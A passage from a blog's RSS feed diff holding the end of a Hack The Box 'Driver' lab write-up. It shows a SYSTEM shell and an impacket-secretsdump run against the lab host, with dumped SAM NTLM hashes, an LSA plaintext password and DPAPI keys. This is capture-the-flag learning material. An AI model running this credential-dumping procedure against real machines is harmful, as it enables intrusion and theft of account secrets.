+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extra shell commands
+Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.10240&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+  
+&lt;div id=&#34;81d19370a4924a68&#34; class=&#34;codetab__content&#34;&gt;
+  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ impacket-secretsdump sckull:sckullx123@driver.htb
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Service RemoteRegistry is in stopped state
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Service RemoteRegistry is disabled, enabling it
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting service RemoteRegistry
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; SAM hashes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;uid:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
+sckull:1004:aad3b435b51404eeaad3b435b51404ee:44198dfc6b720ccdd3323386972d127e:::
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping cached domain logon information &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain/username:hash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping LSA Secrets
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DefaultPassword
+DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony:liltony
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DPAPI_SYSTEM
+dpapi_machinekey:0x68d8efd1bd3fa3ab206268f0bbc6e2a4a5e4b43e
+dpapi_userkey:0x68060403e8f0276a683ad704b45dc7b850d9722f
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stopping service RemoteRegistry
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Restoring the disabled state &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; service RemoteRegistry
+ π ~/htb/driver ❯
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;script&gt;
+  &#39;use strict&#39;;
+
+  var containerId = JSON.parse(&#34;\&#34;cd2f290d04244578\&#34;&#34;);
+  var containerElem = document.getElementById(containerId);
+  var codetabLinks = null;
+  var codetabContents = null;
+  var ids = [];
+
+  if (containerElem) {
+    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
+    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
+  }
+
+  for (var i = 0; i &lt; codetabContents.length; i++) {
+    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
+    codetabContents[i].style.display = &#39;none&#39;;
+
+    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
+      codetabContents[i].classList.add(&#39;active&#39;);
+    }
+  }
+
+  for (var i = 0; i &lt; codetabLinks.length; i++) {
+    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);
+
+    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
+      codetabLinks[i].classList.add(&#39;active&#39;);
+    } else {
+      codetabLinks[i].classList.remove(&#39;active&#39;);
+    }
+  }
+
+  if (codetabContents.length &gt; 0) {
+    codetabContents[0].style.display = &#39;block&#39;;
+  }
+&lt;/script&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/driver/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/driver/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>scf</category>
+            
+          
+            
+              <category>winrm</category>
+            
+          
+            
+              <category>printnightmare</category>
+            
+          
+            
+              <category>powershell</category>
+            
+          
+            
+              <category>responder</category>
+            
+          
+            
+              <category>winpeas</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>windows</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>Hack The Box - ServMon</title>
